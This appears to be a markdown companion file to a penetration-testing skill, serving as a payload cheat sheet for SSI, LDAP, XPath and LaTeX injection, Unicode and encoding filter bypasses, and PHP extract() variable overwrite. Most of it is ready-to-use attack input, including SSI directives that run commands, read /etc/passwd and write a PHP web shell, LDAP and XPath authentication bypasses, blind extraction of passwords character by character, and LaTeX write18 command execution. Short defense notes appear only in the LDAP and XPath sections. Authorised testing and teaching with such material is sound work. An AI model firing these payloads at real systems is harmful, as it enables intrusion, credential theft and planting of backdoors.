# Extra Injection Types — SSI, LDAP, XPath

> Companion to [SKILL.md](./SKILL.md). Covers injection types that are less common in modern web apps but still appear in specific technology stacks.

---

## 1. SSI Injection (Server-Side Includes)

### Mechanism

SSI directives are parsed by the web server (Apache, Nginx, IIS) before sending the response. If user input is embedded in `.shtml` or SSI-enabled pages without sanitization:

```
<!--#exec cmd="id"-->
<!--#include virtual="/etc/passwd"-->
```

### Detection

```text
# Probe: inject SSI directive in form field, URL param, or header:
<!--#echo var="DATE_LOCAL"-->

# If response contains the current date → SSI is active and input is parsed

# Confirm command execution:
<!--#exec cmd="id"-->
```

### Prerequisites

- Apache with `mod_include` and `Options +Includes`
- File extension `.shtml` or `AddOutputFilter INCLUDES .html`
- Nginx with `ssi on;` in location block
- IIS with SSI feature installed

### Key Payloads

```text
# Command execution:
<!--#exec cmd="id"-->
<!--#exec cmd="cat /etc/passwd"-->
<!--#exec cmd="ls -la"-->

# File include:
<!--#include virtual="/etc/passwd"-->
<!--#include file="config.php"-->

# Variable echo (safe probe):
<!--#echo var="DOCUMENT_ROOT"-->
<!--#echo var="SERVER_SOFTWARE"-->
<!--#echo var="REMOTE_ADDR"-->

# Chained with file write:
<!--#exec cmd="echo '<?php system($_GET[c]);?>' > /var/www/html/shell.php"-->
```

### Nginx SSI Configuration

```nginx
location / {
    ssi on;
    ssi_types text/shtml;
}
```

### Real-World Case: SSI via File Upload

Upload a file named `shell.shtml` with SSI directives:
```text
<!--#exec cmd="whoami"-->
```

If the web server processes `.shtml` files → command executes on page load.

### Where to Test

- Guest books, comment systems, forums
- Error pages that include user input
- Any `.shtml` endpoint accepting user data
- File upload → upload `.shtml` file with SSI directives

---

## 2. LDAP Injection

### Mechanism

LDAP queries use a filter syntax. When user input is concatenated into filters without sanitization:

```
Original:  (&(uid=USER_INPUT)(password=PASS_INPUT))
Injection: (&(uid=admin)(|(password=*)(1=1)))(password=anything))
```

### Detection

```text
# Authentication bypass — classic:
Username: admin)(&)
Password: anything
# Filter becomes: (&(uid=admin)(&))(password=anything))
# The (&) always evaluates to TRUE

# OR injection:
Username: *)(uid=*))(|(uid=*
Password: anything
# Lists all users
```

### Common Filter Patterns

```text
# Search filter: (&(cn=INPUT)(objectClass=person))
# Auth filter:   (&(uid=INPUT)(userPassword=INPUT2))

# Metacharacters:
*   — wildcard (matches anything)
()  — grouping
&   — AND
|   — OR
!   — NOT
```

### Exploitation Scenarios

#### Authentication Bypass — Null Byte Truncation

```text
# When passwords are hashed (common in OpenLDAP):
Username: admin%00                 # URL-encoded null byte
# In Burp, change %2500 to %00 (actual null byte)
# LDAP query: (&(uid=admin\00)(userPassword=...))
# Null byte truncates the filter → password check skipped
```

#### Authentication Bypass — Wildcard and Logic

```text
# Simple wildcard:
Username: *
Password: *
# If filter: (&(uid=*)(userPassword=*)) → matches ALL entries

# Logic closure:
Username: zhang)(|(& 
Password: 1
# Filter becomes: (&(uid=zhang)(|(&)(userpassword=1))) → always TRUE
```

#### Authentication Bypass — Alternative Closures

```text
# Username: admin)(!(&(1=0))
# Password: anything
# Result: (&(uid=admin)(!(&(1=0)))(password=anything))
# The !(&(1=0)) = !(FALSE) = TRUE → bypasses password check
```

#### Data Extraction via Wildcard

```text
# Enumerate attributes character by character:
(&(uid=admin)(password=a*))  → invalid → password doesn't start with 'a'
(&(uid=admin)(password=b*))  → invalid
(&(uid=admin)(password=s*))  → valid! → password starts with 's'
(&(uid=admin)(password=se*)) → valid! → second char is 'e'
...
# Continue until full password is extracted
```

#### OR Filter Injection

When the application uses OR filters (e.g., search by department):

```text
# Original filter: (|(o=backend)(o=frontend))
# Injection in first parameter:
type1=backend)(cn=*&type2=frontend&pattern=1
# Result: (|(o=backend)(cn=*)(o=frontend))
# The (cn=*) matches ALL entries → data leak
```

#### User Enumeration

```text
(&(uid=*admin*)(objectClass=person))  → find all users containing "admin"
(&(uid=*)(mail=*@company.com))        → list all users with company email
```

### Defense

- Use parameterized LDAP queries (escape special chars: `*`, `(`, `)`, `\`, NUL)
- Input validation: reject `*()&|!=` in username/password fields
- Principle of least privilege for LDAP bind accounts

---

## 3. XPath Injection

### Mechanism

XPath queries navigate XML documents. When user input enters XPath expressions:

```xml
<!-- XML data store: -->
<users>
  <user><name>admin</name><password>s3cret</password><role>admin</role></user>
  <user><name>guest</name><password>guest</password><role>user</role></user>
</users>
```

```
Original query:  //user[name='INPUT' and password='INPUT2']
Injection:       //user[name='admin' or '1'='1' and password='anything' or '1'='1']
```

### Authentication Bypass

```text
Username: admin' or '1'='1
Password: anything' or '1'='1
# Query: //user[name='admin' or '1'='1' and password='anything' or '1'='1']
# Always matches → returns first user (usually admin)
```

### Blind XPath Injection — Step-by-Step Methodology

When results are not directly visible, systematically map the XML structure then extract data:

```text
# Step 1: Confirm root structure
' or count(/)=1 and '1'='1              # always TRUE — 1 root document
' or count(/*)=1 and '1'='1             # check number of root element children

# Step 2: Discover root element name
' or string-length(name(//*[1]))=5 and '1'='1   # root element name is 5 chars?
' or substring(name(//*[1]),1,1)='u' and '1'='1  # first char is 'u'?

# Step 3: Count child nodes
' or count(/accounts)=1 and '1'='1      # confirm /accounts exists
' or count(/accounts/user)>0 and '1'='1 # has user children?
' or count(/accounts/user)=2 and '1'='1 # exactly 2 users

# Step 4: Discover child element names
' or string-length(name(/accounts/*[1]))=4 and '1'='1  # child name is 4 chars → "user"

# Step 5: Enumerate user attributes
' or count(/accounts/user[1]/*)>0 and '1'='1  # user has child elements?

# Step 6: Extract password length
' or string-length(//user[1]/password)=6 or '1'='2

# Step 7: Extract password character by character
' or substring(//user[1]/password,1,1)='s' or '1'='2  # 1st char
' or substring(//user[1]/password,2,1)='e' or '1'='2  # 2nd char
' or substring(//user[1]/password,3,1)='c' or '1'='2  # 3rd char
...
```

### Vulnerable Code Pattern (PHP)

```php
$x_query = "/accounts/user[username='{$username}' and password='{$password}']";
$result = $xml->xpath($x_query);
if ($result) { /* login success */ }
```

### Useful XPath Functions for Blind Extraction

```text
string-length(string)          → length of string
substring(string, pos, len)    → extract substring
count(node-set)                → count nodes
name(node)                     → element name
concat(str1, str2)             → concatenate
contains(str, substr)          → boolean contains check
starts-with(str, prefix)       → boolean prefix check
normalize-space(str)           → trim whitespace
```

### XPath 2.0 Extensions

```text
# If XPath 2.0 is available:
matches(string, regex)         → regex matching
lower-case(string)             → case conversion
tokenize(string, pattern)      → split string
```

### Defense

- Use parameterized XPath queries
- Input validation: reject `'`, `"`, `(`, `)`, `/`, `[`, `]`, `:`, `*`, `=`
- Consider using a proper database instead of XML data files for authentication

---

## 4. LaTeX Injection

When applications compile user-provided LaTeX (thesis generators, PDF report builders, math rendering):

### File Read

```latex
\input{/etc/passwd}
\include{/etc/passwd}

% With line numbers:
\lstinputlisting{/etc/passwd}

% Via verbatim:
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

### Command Execution (requires --shell-escape or equivalent)

```latex
% write18 is the classic RCE primitive:
\immediate\write18{id > /tmp/output.txt}
\input{/tmp/output.txt}

% Pipe variant:
\immediate\write18{cat /etc/passwd | base64 > /tmp/b64.txt}

% Input with pipe (some engines):
\input{|id}
```

### Cross-Site Scripting (MathJax/client-side LaTeX)

```latex
% If LaTeX is rendered client-side via MathJax or KaTeX:
% Some versions allow HTML injection through \href or \url:
\href{javascript:alert(1)}{click}
```

### Detection

```text
# Probe: Does the following render?
$\frac{1}{2}$           → basic math renders
\input{/etc/hostname}    → file inclusion attempt
\write18{id}             → command execution attempt
```

---

## 5. Encoding Transformation Bypass

Unicode normalization and encoding differences can bypass security filters:

### Unicode Normalization Exploits

```text
# NFC/NFD/NFKC/NFKD normalization can change characters:
# NFKC normalizes: ﬀ (U+FB00, LATIN SMALL LIGATURE FF) → "ff"
# Fullwidth characters: Ａ (U+FF21) → "A"

# Attack: Register username "ⓐdmin" → normalizes to "admin" after filter check
# Password reset: request for "Ａdmin" (fullwidth A) → matches "admin" in DB
```

### Punycode / Homograph Attacks

```text
# IDN domains: аpple.com (Cyrillic а) looks like apple.com
# xn--pple-43d.com → displays as аpple.com in browsers

# Used for: phishing, open redirect filter bypass, SSRF domain validation bypass
```

### MySQL Collation Tricks

```sql
-- Default utf8_general_ci treats certain Unicode chars as equivalent:
-- 'a' = 'ᵃ' (U+1D43, MODIFIER LETTER SMALL A)
SELECT * FROM users WHERE username = 'ᵃdmin'  -- matches 'admin'!

-- Exploitation: Register as 'ᵃdmin', system treats as 'admin'
```

### Base64 Ambiguity

```text
# Same base64 string can decode differently depending on charset/padding:
# Some WAFs decode base64 for inspection but use different decoder than app
# Malformed base64 padding may bypass WAF but still decode in app
```

### Double Encoding

```text
%252e%252e%252f  → %2e%2e%2f (after first decode) → ../ (after second decode)
# If WAF decodes once but app decodes twice → filter bypass
```

---

## 6. PHP External Variable Modification

When PHP applications use `extract()` or `import_request_variables()` on untrusted input:

### extract() Variable Overwrite

```php
// Vulnerable:
extract($_GET);
// Attacker: ?auth=true&is_admin=1
// Now $auth = "true" and $is_admin = "1" in the application scope

// Combined with include:
extract($_GET);
include($template . ".php");
// Attacker: ?template=../../../../etc/passwd%00
```

### EXTR_OVERWRITE vs EXTR_SKIP

```php
// Default: EXTR_OVERWRITE — overwrites existing variables (dangerous!)
extract($_POST);  // Overwrites even $db_password if POST has it

// Safer but still risky:
extract($_POST, EXTR_SKIP);  // Won't overwrite existing, but creates new globals
```

### $GLOBALS Overwrite (PHP < 8.1)

```php
// In PHP < 8.1, $GLOBALS could be modified:
// Attacker: ?GLOBALS[admin]=1
extract($_GET);  // $GLOBALS['admin'] = 1 if EXTR_OVERWRITE

// PHP 8.1+ made $GLOBALS read-only — this attack no longer works
```

### Detection

```text
# Look for:
# - extract($_GET), extract($_POST), extract($_REQUEST)
# - parse_str($query) without second parameter (imports to current scope)
# - import_request_variables() (removed in PHP 5.4)
# - $$variable (variable variables with user input)
```
